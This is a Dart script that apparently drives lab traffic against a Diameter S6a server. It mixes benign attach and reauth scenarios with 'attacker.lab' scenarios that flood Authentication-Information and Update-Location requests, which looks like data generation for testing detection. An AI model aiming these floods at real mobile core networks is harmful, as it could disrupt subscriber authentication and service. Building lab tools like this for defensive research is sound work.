import 'dart:async';
import 'dart:io';

import 'package:diameter_protocol/applications/base/capabilities_exchange.dart';
import 'package:diameter_protocol/applications/s6a/s6a.dart';
import 'package:diameter_protocol/core/avp_dictionary.dart';
import 'package:diameter_protocol/core/diameter_client.dart';

Future<void> main(List<String> args) async {
  if (args.length < 2) {
    stderr.writeln(
      'usage: external_attack_driver.dart <scenario> <count> [delay_ms]',
    );
    exitCode = 2;
    return;
  }

  final scenario = args[0];
  final count = int.parse(args[1]);
  final delayMs = args.length > 2 ? int.parse(args[2]) : 0;

  final serverHost = Platform.environment['S6A_HOST'] ?? '127.0.0.1';
  final serverPort = int.parse(Platform.environment['S6A_PORT'] ?? '3868');
  final destinationRealm =
      Platform.environment['S6A_DEST_REALM'] ?? 'open5gs.org';
  final imsi =
      Platform.environment['S6A_IMSI'] ?? '999700000000001';

  final isBenign = scenario.startsWith('benign_');
  final originHost = isBenign ? 'mme.benign.lab' : 'attacker.lab';
  final originRealm = 'lab';
  final originStateId = DateTime.now().millisecondsSinceEpoch ~/ 1000;

  final client = DiameterClient(
    host: serverHost,
    port: serverPort,
    originHost: originHost,
    originRealm: originRealm,
    originStateId: originStateId,
    watchdogInterval: const Duration(minutes: 5),
  );

  Future<void> pause() async {
    if (delayMs > 0) {
      await Future<void>.delayed(Duration(milliseconds: delayMs));
    }
  }

  Future<void> sendAir(int n) async {
    final req = AuthenticationInformationRequest(
      sessionId: '$originHost;air;$n;${DateTime.now().microsecondsSinceEpoch}',
      originHost: originHost,
      originRealm: originRealm,
      destinationRealm: destinationRealm,
      imsi: imsi,
      visitedPlmnId: '99970',
    );
    final answer = await client.sendRequest(req);
    if (answer == null) {
      throw StateError('AIR $n returned no answer');
    }
  }

  Future<void> sendUlr(int n) async {
    final req = UpdateLocationRequest(
      sessionId: '$originHost;ulr;$n;${DateTime.now().microsecondsSinceEpoch}',
      originHost: originHost,
      originRealm: originRealm,
      destinationRealm: destinationRealm,
      imsi: imsi,
      visitedPlmnId: '99970',
    );
    final answer = await client.sendRequest(req);
    if (answer == null) {
      throw StateError('ULR $n returned no answer');
    }
  }

  try {
    await client.connect();
    final cer = CapabilitiesExchangeRequest(
      originHost: originHost,
      originRealm: originRealm,
      hostIpAddress: '127.0.0.1',
      vendorId: VENDOR_ID_3GPP,
      productName: isBenign ? 'BenignMME-Lab' : 'AttackerPeer-Lab',
      supportedVendorIds: const [VENDOR_ID_3GPP],
      authApplicationIds: const [APP_ID_3GPP_S6A],
      originStateId: originStateId,
      vendorSpecificApplicationIds: const [
        (
          vendorId: VENDOR_ID_3GPP,
          authApplicationId: APP_ID_3GPP_S6A,
        ),
      ],
    );
    final cea = await client.sendRequest(cer);
    if (cea == null) {
      throw StateError('CER/CEA failed');
    }

    switch (scenario) {
      case 'benign_attach':
        for (var i = 0; i < count; i++) {
          await sendAir(i);
          await pause();
          await sendUlr(i);
          await pause();
        }
        break;

      case 'benign_reauth':
        for (var i = 0; i < count; i++) {
          await sendAir(i);
          await Future<void>.delayed(
            Duration(milliseconds: delayMs > 0 ? delayMs : 750),
          );
        }
        break;

      case 'air_flood':
        for (var i = 0; i < count; i++) {
          await sendAir(i);
          await pause();
        }
        break;

      case 'ulr_flood':
        for (var i = 0; i < count; i++) {
          await sendUlr(i);
          await pause();
        }
        break;

      case 'mixed_flood':
        for (var i = 0; i < count; i++) {
          await sendAir(i);
          await sendUlr(i);
          await pause();
        }
        break;

      case 'tracking_burst':
        for (var i = 0; i < count; i++) {
          await sendAir(i * 3);
          await sendAir(i * 3 + 1);
          await sendAir(i * 3 + 2);
          await sendUlr(i);
          await pause();
        }
        break;

      default:
        throw ArgumentError('unknown scenario: $scenario');
    }

    await Future<void>.delayed(const Duration(milliseconds: 150));
    stdout.writeln(
      'scenario=$scenario count=$count delay_ms=$delayMs completed',
    );
  } finally {
    await client.disconnect();
  }
}
